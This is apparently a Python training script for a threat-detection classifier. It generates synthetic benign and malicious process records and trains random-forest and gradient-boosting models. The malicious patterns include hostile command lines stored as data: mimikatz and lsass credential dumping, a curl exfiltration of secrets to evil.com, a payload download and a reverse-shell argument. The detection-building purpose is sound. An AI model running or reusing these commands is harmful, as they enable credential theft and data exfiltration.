"""
FortifAI ML Model Training Pipeline - Reduce False Positives
=============================================================

This script properly trains models to reduce false positives.

The key to reducing false positives:
1. Use REAL labeled data from your environment
2. Have plenty of "normal" examples (benign processes)
3. Tune the confidence threshold
4. Regularly retrain with new data

USAGE:
------
# Step 1: Generate training data template
python train_classifier.py --create-template

# Step 2: Collect real data and label it (or use synthetic)
python train_classifier.py --generate-synthetic

# Step 3: Train the model
python train_classifier.py --train --data training_data.csv

# Step 4: Deploy trained model
python train_classifier.py --deploy
"""

import os
import sys
import json
import random
import argparse
import pandas as pd
import numpy as np
from datetime import datetime, timedelta
from pathlib import Path
import pickle

# Configuration
MODELS_DIR = Path(__file__).parent.parent / 'ml-models' / 'trained'
DATA_DIR = Path(__file__).parent.parent / 'ml-models' / 'training-data'


class TrainingDataGenerator:
    """Generate realistic labeled training data for ML training"""
    
    def __init__(self):
        self.threat_categories = [
            'normal', 'malware', 'ransomware', 'trojan',
            'ddos', 'brute_force', 'data_exfiltration', 'privilege_escalation'
        ]
        
        # =====================================================================
        # NORMAL PROCESSES - These should NEVER trigger alerts
        # =====================================================================
        self.normal_processes = [
            # Windows System Processes
            {'name': 'System', 'user': 'NT AUTHORITY\\SYSTEM', 'cpu': (0, 5), 'mem': (0, 0.5)},
            {'name': 'System Idle Process', 'user': 'NT AUTHORITY\\SYSTEM', 'cpu': (80, 99), 'mem': (0, 0.1)},
            {'name': 'svchost.exe', 'user': 'NT AUTHORITY\\SYSTEM', 'cpu': (0, 15), 'mem': (0.1, 3)},
            {'name': 'csrss.exe', 'user': 'NT AUTHORITY\\SYSTEM', 'cpu': (0, 3), 'mem': (0.1, 1)},
            {'name': 'lsass.exe', 'user': 'NT AUTHORITY\\SYSTEM', 'cpu': (0, 5), 'mem': (0.1, 2)},
            {'name': 'services.exe', 'user': 'NT AUTHORITY\\SYSTEM', 'cpu': (0, 2), 'mem': (0.1, 1)},
            {'name': 'wininit.exe', 'user': 'NT AUTHORITY\\SYSTEM', 'cpu': (0, 1), 'mem': (0.1, 0.5)},
            {'name': 'winlogon.exe', 'user': 'NT AUTHORITY\\SYSTEM', 'cpu': (0, 2), 'mem': (0.1, 1)},
            {'name': 'smss.exe', 'user': 'NT AUTHORITY\\SYSTEM', 'cpu': (0, 1), 'mem': (0.1, 0.5)},
            {'name': 'spoolsv.exe', 'user': 'NT AUTHORITY\\SYSTEM', 'cpu': (0, 5), 'mem': (0.5, 2)},
            {'name': 'SearchIndexer.exe', 'user': 'NT AUTHORITY\\SYSTEM', 'cpu': (0, 30), 'mem': (1, 5)},
            
            # Windows User Processes  
            {'name': 'explorer.exe', 'user': 'USER', 'cpu': (0, 10), 'mem': (1, 5)},
            {'name': 'dwm.exe', 'user': 'USER', 'cpu': (0, 25), 'mem': (1, 10)},
            {'name': 'taskhostw.exe', 'user': 'USER', 'cpu': (0, 5), 'mem': (0.5, 2)},
            {'name': 'RuntimeBroker.exe', 'user': 'USER', 'cpu': (0, 10), 'mem': (1, 5)},
            {'name': 'ShellExperienceHost.exe', 'user': 'USER', 'cpu': (0, 5), 'mem': (1, 4)},
            
            # Browsers (commonly high CPU/memory - NOT suspicious)
            {'name': 'chrome.exe', 'user': 'USER', 'cpu': (0, 60), 'mem': (2, 25)},
            {'name': 'firefox.exe', 'user': 'USER', 'cpu': (0, 50), 'mem': (2, 20)},
            {'name': 'msedge.exe', 'user': 'USER', 'cpu': (0, 50), 'mem': (2, 20)},
            {'name': 'brave.exe', 'user': 'USER', 'cpu': (0, 50), 'mem': (2, 18)},
            
            # Development Tools (high CPU is NORMAL)
            {'name': 'Code.exe', 'user': 'USER', 'cpu': (0, 40), 'mem': (2, 15)},
            {'name': 'python.exe', 'user': 'USER', 'cpu': (0, 100), 'mem': (0.5, 25)},
            {'name': 'python3.exe', 'user': 'USER', 'cpu': (0, 100), 'mem': (0.5, 25)},
            {'name': 'node.exe', 'user': 'USER', 'cpu': (0, 100), 'mem': (1, 20)},
            {'name': 'java.exe', 'user': 'USER', 'cpu': (0, 100), 'mem': (5, 30)},
            {'name': 'javaw.exe', 'user': 'USER', 'cpu': (0, 100), 'mem': (5, 30)},
            {'name': 'devenv.exe', 'user': 'USER', 'cpu': (0, 60), 'mem': (5, 20)},
            {'name': 'rider64.exe', 'user': 'USER', 'cpu': (0, 60), 'mem': (5, 25)},
            {'name': 'pycharm64.exe', 'user': 'USER', 'cpu': (0, 60), 'mem': (5, 25)},
            
            # Docker & Containers (high resource usage is NORMAL)
            {'name': 'docker.exe', 'user': 'USER', 'cpu': (0, 50), 'mem': (1, 10)},
            {'name': 'Docker Desktop.exe', 'user': 'USER', 'cpu': (0, 30), 'mem': (2, 15)},
            {'name': 'com.docker.backend.exe', 'user': 'USER', 'cpu': (0, 40), 'mem': (2, 10)},
            {'name': 'wsl.exe', 'user': 'USER', 'cpu': (0, 50), 'mem': (1, 10)},
            {'name': 'wslhost.exe', 'user': 'USER', 'cpu': (0, 30), 'mem': (1, 5)},
            
            # Shells & Terminals (NORMAL - developers use these)
            {'name': 'bash.exe', 'user': 'USER', 'cpu': (0, 50), 'mem': (0.5, 5)},
            {'name': 'sh.exe', 'user': 'USER', 'cpu': (0, 30), 'mem': (0.3, 3)},
            {'name': 'zsh.exe', 'user': 'USER', 'cpu': (0, 30), 'mem': (0.5, 5)},
            {'name': 'powershell.exe', 'user': 'USER', 'cpu': (0, 50), 'mem': (1, 10)},
            {'name': 'pwsh.exe', 'user': 'USER', 'cpu': (0, 50), 'mem': (1, 10)},
            {'name': 'cmd.exe', 'user': 'USER', 'cpu': (0, 20), 'mem': (0.1, 2)},
            {'name': 'WindowsTerminal.exe', 'user': 'USER', 'cpu': (0, 20), 'mem': (1, 8)},
            {'name': 'conhost.exe', 'user': 'USER', 'cpu': (0, 10), 'mem': (0.5, 3)},
            
            # Build Tools (can use 100% CPU - NOT suspicious)
            {'name': 'npm.exe', 'user': 'USER', 'cpu': (0, 100), 'mem': (1, 15)},
            {'name': 'tsc.exe', 'user': 'USER', 'cpu': (0, 100), 'mem': (1, 10)},
            {'name': 'webpack.exe', 'user': 'USER', 'cpu': (0, 100), 'mem': (2, 15)},
            {'name': 'MSBuild.exe', 'user': 'USER', 'cpu': (0, 100), 'mem': (2, 15)},
            {'name': 'cl.exe', 'user': 'USER', 'cpu': (0, 100), 'mem': (1, 10)},
            {'name': 'gcc.exe', 'user': 'USER', 'cpu': (0, 100), 'mem': (1, 10)},
            
            # Git (network activity is NORMAL)
            {'name': 'git.exe', 'user': 'USER', 'cpu': (0, 50), 'mem': (0.5, 5)},
            {'name': 'git-remote-https.exe', 'user': 'USER', 'cpu': (0, 30), 'mem': (0.5, 3)},
            {'name': 'ssh.exe', 'user': 'USER', 'cpu': (0, 10), 'mem': (0.3, 2)},
            
            # Office Applications
            {'name': 'OUTLOOK.EXE', 'user': 'USER', 'cpu': (0, 25), 'mem': (2, 12)},
            {'name': 'WINWORD.EXE', 'user': 'USER', 'cpu': (0, 30), 'mem': (2, 10)},
            {'name': 'EXCEL.EXE', 'user': 'USER', 'cpu': (0, 50), 'mem': (2, 15)},
            {'name': 'POWERPNT.EXE', 'user': 'USER', 'cpu': (0, 30), 'mem': (2, 10)},
            
            # Communication Apps
            {'name': 'Teams.exe', 'user': 'USER', 'cpu': (0, 30), 'mem': (3, 18)},
            {'name': 'Slack.exe', 'user': 'USER', 'cpu': (0, 20), 'mem': (2, 12)},
            {'name': 'Discord.exe', 'user': 'USER', 'cpu': (0, 20), 'mem': (2, 12)},
            {'name': 'Zoom.exe', 'user': 'USER', 'cpu': (0, 40), 'mem': (3, 15)},
            
            # Security Software (high activity is NORMAL)
            {'name': 'MsMpEng.exe', 'user': 'NT AUTHORITY\\SYSTEM', 'cpu': (0, 80), 'mem': (2, 10)},
            {'name': 'NisSrv.exe', 'user': 'NT AUTHORITY\\SYSTEM', 'cpu': (0, 20), 'mem': (1, 5)},
        ]
        
        # =====================================================================
        # MALICIOUS PATTERNS - These SHOULD trigger alerts
        # =====================================================================
        self.malicious_patterns = {
            'malware': [
                {'name': 'mimikatz.exe', 'cmd': 'mimikatz.exe sekurlsa::logonpasswords'},
                {'name': 'mimikatz.exe', 'cmd': 'mimikatz.exe lsadump::sam'},
                {'name': 'svchosts.exe', 'cmd': 'svchosts.exe -connect evil.com'},  # Typo = suspicious
                {'name': 'scvhost.exe', 'cmd': 'scvhost.exe'},  # Another typo
                {'name': 'explore.exe', 'cmd': 'explore.exe'},  # Not explorer.exe
                {'name': 'csrs.exe', 'cmd': 'csrs.exe --hidden'},  # Not csrss.exe
            ],
            'ransomware': [
                {'name': 'encrypt.exe', 'cmd': 'encrypt.exe --recursive C:\\Users'},
                {'name': 'locker.exe', 'cmd': 'locker.exe --wallet bc1qxy...'},
                {'name': 'cryptor.exe', 'cmd': 'cryptor.exe -aes256 -all'},
                {'name': 'ransom.exe', 'cmd': 'ransom.exe --encrypt --payment'},
            ],
            'trojan': [
                {'name': 'svchost.exe', 'cmd': 'svchost.exe -connect 185.141.62.123:443', 'user': 'USER'},
                {'name': 'update.exe', 'cmd': 'update.exe --silent --download http://evil.com/payload'},
                {'name': 'chrome_update.exe', 'cmd': 'chrome_update.exe --no-ui'},
                {'name': 'helper.exe', 'cmd': 'helper.exe --reverse-shell 10.0.0.1:4444'},
            ],
            'ddos': [
                {'name': 'stress.exe', 'cmd': 'stress.exe --cpu 16 --flood'},
                {'name': 'hping.exe', 'cmd': 'hping.exe --flood -p 80 target.com'},
                {'name': 'loic.exe', 'cmd': 'loic.exe --target 192.168.1.1'},
                {'name': 'slowloris.exe', 'cmd': 'slowloris.exe -target www.example.com'},
            ],
            'brute_force': [
                {'name': 'hydra.exe', 'cmd': 'hydra.exe -l admin -P wordlist.txt ssh://target'},
                {'name': 'medusa.exe', 'cmd': 'medusa.exe -h 10.0.0.1 -u admin -P passwords.txt'},
                {'name': 'john.exe', 'cmd': 'john.exe --wordlist=rockyou.txt hashes.txt'},
                {'name': 'hashcat.exe', 'cmd': 'hashcat.exe -m 1000 hash.txt wordlist.txt'},
            ],
            'data_exfiltration': [
                {'name': 'rclone.exe', 'cmd': 'rclone.exe copy C:\\Confidential remote:exfil'},
                {'name': 'curl.exe', 'cmd': 'curl.exe -X POST -d @secrets.txt http://evil.com'},
                {'name': 'ftp.exe', 'cmd': 'ftp.exe -s:script.txt evil-server.com'},
                {'name': 'sftp.exe', 'cmd': 'sftp.exe attacker@evil.com:/stolen'},
            ],
            'privilege_escalation': [
                {'name': 'winpeas.exe', 'cmd': 'winpeas.exe'},
                {'name': 'linpeas.sh', 'cmd': 'bash linpeas.sh'},
                {'name': 'juicypotato.exe', 'cmd': 'juicypotato.exe -l 1337 -p cmd.exe'},
                {'name': 'printspoofer.exe', 'cmd': 'printspoofer.exe -i -c cmd'},
                {'name': 'powershell.exe', 'cmd': 'powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA='},
                {'name': 'psexec.exe', 'cmd': 'psexec.exe \\\\target -s cmd.exe'},
                {'name': 'procdump.exe', 'cmd': 'procdump.exe -ma lsass.exe lsass.dmp'},
            ],
        }
    
    def generate_normal_sample(self) -> dict:
        """Generate a NORMAL (benign) sample - should NOT trigger alerts"""
        proc = random.choice(self.normal_processes)
        
        return {
            'timestamp': self._random_timestamp(),
            'process_name': proc['name'],
            'user': proc['user'].replace('USER', os.environ.get('USERNAME', 'user')),
            'cpu_usage': random.uniform(*proc['cpu']),
            'memory_usage': random.uniform(*proc['mem']),
            'cmdline': proc['name'],  # Normal cmdline
            'pid': random.randint(100, 65000),
            'ppid': random.randint(1, 10000),
            'is_suspicious': False,
            'has_network_activity': random.choice([0, 0, 0, 1]),
            'connection_count': random.randint(0, 10),
            'label': 'normal'
        }
    
    def generate_malicious_sample(self, threat_type: str) -> dict:
        """Generate a MALICIOUS sample - SHOULD trigger alerts"""
        patterns = self.malicious_patterns.get(threat_type, [])
        pattern = random.choice(patterns) if patterns else {'name': 'malware.exe', 'cmd': 'malware.exe'}
        
        return {
            'timestamp': self._random_timestamp(),
            'process_name': pattern['name'],
            'user': pattern.get('user', os.environ.get('USERNAME', 'user')),
            'cpu_usage': random.uniform(30, 90),
            'memory_usage': random.uniform(5, 30),
            'cmdline': pattern['cmd'],
            'pid': random.randint(100, 65000),
            'ppid': random.randint(1, 10000),
            'is_suspicious': True,
            'has_network_activity': 1 if threat_type in ['ddos', 'data_exfiltration', 'trojan', 'brute_force'] else 0,
            'connection_count': random.randint(10, 200) if threat_type in ['ddos', 'brute_force'] else random.randint(0, 10),
            'label': threat_type
        }
    
    def _random_timestamp(self) -> str:
        now = datetime.now()
        dt = now - timedelta(days=random.randint(0, 30), hours=random.randint(0, 23))
        return dt.isoformat()
    
    def generate_dataset(self, n_normal: int = 8000, n_per_threat: int = 400) -> pd.DataFrame:
        """
        Generate a BALANCED training dataset
        
        For reducing false positives:
        - More normal samples than malicious
        - Good variety of normal processes
        """
        samples = []
        
        print(f"Generating {n_normal} normal samples...")
        for _ in range(n_normal):
            samples.append(self.generate_normal_sample())
        
        threat_types = list(self.malicious_patterns.keys())
        for threat_type in threat_types:
            print(f"Generating {n_per_threat} {threat_type} samples...")
            for _ in range(n_per_threat):
                samples.append(self.generate_malicious_sample(threat_type))
        
        random.shuffle(samples)
        df = pd.DataFrame(samples)
        
        print(f"\nDataset Summary:")
        print(f"  Total samples: {len(df)}")
        print(f"  Normal: {len(df[df['label'] == 'normal'])} ({100*len(df[df['label']=='normal'])/len(df):.1f}%)")
        print(f"  Malicious: {len(df[df['label'] != 'normal'])} ({100*len(df[df['label']!='normal'])/len(df):.1f}%)")
        
        return df


def extract_features(row: dict) -> dict:
    """Extract ML features from a log entry"""
    process_name = str(row.get('process_name', '')).lower()
    cmdline = str(row.get('cmdline', '')).lower()
    user = str(row.get('user', '')).lower()
    
    return {
        # Resource usage
        'cpu_usage': float(row.get('cpu_usage', 0) or 0),
        'memory_usage': float(row.get('memory_usage', 0) or 0),
        
        # Process characteristics
        'process_name_length': len(process_name),
        'cmdline_length': len(cmdline),
        'has_args': 1 if ' ' in cmdline else 0,
        
        # Suspicious indicators
        'is_system_user': 1 if 'system' in user or 'nt authority' in user else 0,
        'is_temp_path': 1 if 'temp' in cmdline or 'tmp' in cmdline else 0,
        'has_ip_address': 1 if any(c.isdigit() and '.' in cmdline for c in cmdline) else 0,
        'has_encoded_cmd': 1 if 'encodedcommand' in cmdline or 'base64' in cmdline or '-enc' in cmdline else 0,
        'has_download_cmd': 1 if 'download' in cmdline or 'wget' in cmdline or 'curl' in cmdline else 0,
        'has_connect_cmd': 1 if 'connect' in cmdline or 'reverse' in cmdline or 'shell' in cmdline else 0,
        
        # Known tool patterns
        'is_mimikatz': 1 if 'mimikatz' in process_name or 'sekurlsa' in cmdline else 0,
        'is_psexec': 1 if 'psexec' in process_name else 0,
        'is_procdump': 1 if 'procdump' in process_name else 0,
        
        # Process name typos (common malware technique)
        'has_typo_svchost': 1 if process_name in ['svchosts.exe', 'scvhost.exe', 'svhost.exe'] else 0,
        'has_typo_csrss': 1 if process_name in ['csrs.exe', 'csrrs.exe', 'cssrs.exe'] else 0,
        'has_typo_explorer': 1 if process_name in ['explore.exe', 'explorar.exe'] else 0,
        
        # Network indicators
        'has_network_activity': int(row.get('has_network_activity', 0) or 0),
        'connection_count': int(row.get('connection_count', 0) or 0),
    }


def train_simple_model(df: pd.DataFrame, output_dir: Path):
    """Train a simple but effective classifier"""
    from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
    from sklearn.model_selection import train_test_split
    from sklearn.preprocessing import LabelEncoder
    from sklearn.metrics import classification_report
    
    print("\n" + "="*60)
    print("TRAINING ML MODEL")
    print("="*60)
    
    # Extract features
    print("\nExtracting features...")
    features = [extract_features(row) for _, row in df.iterrows()]
    X = pd.DataFrame(features)
    
    # Encode labels
    le = LabelEncoder()
    y = le.fit_transform(df['label'])
    
    # Split data
    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42, stratify=y)
    
    print(f"Training set: {len(X_train)} samples")
    print(f"Test set: {len(X_test)} samples")
    
    # Train Random Forest
    print("\nTraining Random Forest...")
    rf = RandomForestClassifier(
        n_estimators=200,
        max_depth=15,
        min_samples_split=5,
        class_weight='balanced',  # Important for imbalanced data
        random_state=42,
        n_jobs=-1
    )
    rf.fit(X_train, y_train)
    rf_score = rf.score(X_test, y_test)
    print(f"  Accuracy: {rf_score:.4f}")
    
    # Train Gradient Boosting
    print("\nTraining Gradient Boosting...")
    gb = GradientBoostingClassifier(
        n_estimators=100,
        max_depth=8,
        learning_rate=0.1,
        random_state=42
    )
    gb.fit(X_train, y_train)
    gb_score = gb.score(X_test, y_test)
    print(f"  Accuracy: {gb_score:.4f}")
    
    # Detailed report
    print("\n" + "="*60)
    print("CLASSIFICATION REPORT (Random Forest)")
    print("="*60)
    y_pred = rf.predict(X_test)
    print(classification_report(y_test, y_pred, target_names=le.classes_))
    
    # Feature importance
    print("\nTop 10 Important Features:")
    importance = pd.Series(rf.feature_importances_, index=X.columns).sort_values(ascending=False)
    for feat, imp in importance.head(10).items():
        print(f"  {feat}: {imp:.4f}")
    
    # Save models
    output_dir.mkdir(parents=True, exist_ok=True)
    
    with open(output_dir / 'rf_model.pkl', 'wb') as f:
        pickle.dump(rf, f)
    with open(output_dir / 'gb_model.pkl', 'wb') as f:
        pickle.dump(gb, f)
    with open(output_dir / 'label_encoder.pkl', 'wb') as f:
        pickle.dump(le, f)
    with open(output_dir / 'feature_columns.json', 'w') as f:
        json.dump(list(X.columns), f)
    
    # Save metadata
    metadata = {
        'trained_at': datetime.now().isoformat(),
        'samples': len(df),
        'rf_accuracy': rf_score,
        'gb_accuracy': gb_score,
        'classes': list(le.classes_),
        'feature_columns': list(X.columns)
    }
    with open(output_dir / 'model_metadata.json', 'w') as f:
        json.dump(metadata, f, indent=2)
    
    print(f"\n✓ Models saved to {output_dir}")
    
    return rf, gb, le


def update_ml_engine_to_use_trained_model():
    """Generate code to update ML engine to use trained models"""
    
    code = '''
# Add this to threat_classifier.py to use trained models:

def load_trained_models(self, model_dir):
    """Load pre-trained sklearn models"""
    import pickle
    import json
    
    with open(f'{model_dir}/rf_model.pkl', 'rb') as f:
        self.rf_model = pickle.load(f)
    with open(f'{model_dir}/gb_model.pkl', 'rb') as f:
        self.gb_model = pickle.load(f)
    with open(f'{model_dir}/label_encoder.pkl', 'rb') as f:
        self.label_encoder = pickle.load(f)
    with open(f'{model_dir}/feature_columns.json', 'r') as f:
        self.feature_columns = json.load(f)
    
    self.is_trained = True
    print(f"Loaded trained models from {model_dir}")
'''
    print(code)


def main():
    parser = argparse.ArgumentParser(description='FortifAI ML Model Training')
    parser.add_argument('--generate-synthetic', action='store_true', help='Generate synthetic training data')
    parser.add_argument('--train', action='store_true', help='Train the model')
    parser.add_argument('--data', type=str, help='Path to training data CSV')
    parser.add_argument('--output', type=str, default=str(MODELS_DIR), help='Output directory')
    
    args = parser.parse_args()
    
    output_dir = Path(args.output)
    
    if args.generate_synthetic or args.train:
        # Load or generate data
        if args.data and os.path.exists(args.data):
            print(f"Loading data from {args.data}...")
            df = pd.read_csv(args.data)
        else:
            print("Generating synthetic training data...")
            generator = TrainingDataGenerator()
            df = generator.generate_dataset(n_normal=8000, n_per_threat=500)
            
            # Save for reference
            data_dir = Path(DATA_DIR)
            data_dir.mkdir(parents=True, exist_ok=True)
            data_file = data_dir / f'training_data_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'
            df.to_csv(data_file, index=False)
            print(f"Saved training data to {data_file}")
        
        if args.train or args.generate_synthetic:
            train_simple_model(df, output_dir)
    else:
        parser.print_help()
        print("\n" + "="*60)
        print("QUICK START")
        print("="*60)
        print("1. Generate and train with synthetic data:")
        print("   python train_classifier.py --generate-synthetic --train")
        print()
        print("2. Train with your own data:")
        print("   python train_classifier.py --train --data my_labeled_data.csv")


if __name__ == '__main__':
    main()
